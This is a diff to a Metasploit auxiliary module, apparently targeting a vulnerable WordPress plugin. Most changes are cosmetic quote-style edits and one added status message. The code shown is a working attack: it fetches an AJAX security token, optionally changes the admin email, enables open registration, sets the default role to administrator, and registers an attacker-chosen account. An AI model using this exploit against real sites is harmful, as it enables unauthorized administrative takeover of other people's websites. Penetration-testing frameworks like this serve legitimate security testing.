@@ -65,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    print_status("Getting security token from host...")
+    print_status('Getting security token from host...')
     wp_home_res = send_request_cgi(
       'method'    => 'GET',
       'uri'       => target_uri.path
@@ -80,23 +80,24 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['WPEMAIL'].present? && (datastore['WPEMAIL'] =~ URI::MailTo::EMAIL_REGEXP)
       print_warning("Changing admin e-mail address to #{datastore['WPEMAIL']}...")
       if set_wp_option('admin_email', datastore['WPEMAIL'], ajax_security).nil?
-        print_error("Failed to change the admin e-mail address")
+        print_error('Failed to change the admin e-mail address')
         return
       end
     end
 
-    print_warning("Enabling user registrations...")
+    print_warning('Enabling user registrations...')
     if set_wp_option('users_can_register', '1', ajax_security).nil?
-      print_error("Failed to enable user registrations")
+      print_error('Failed to enable user registrations')
       return
     end
 
-    print_warning("Setting the default user role type to administrator...")
+    print_warning('Setting the default user role type to administrator...')
     if set_wp_option('default_role', 'administrator', ajax_security).nil?
       print_error("Failed to set the default user role")
       return
     end
 
+    print_status("Registering #{datastore['USER']} with email #{datastore['EMAIL']}")
     unless (datastore['EMAIL'] =~ URI::MailTo::EMAIL_REGEXP) && wordpress_register(datastore['USER'], datastore['EMAIL'])
       print_error("Failed to register user")
     end
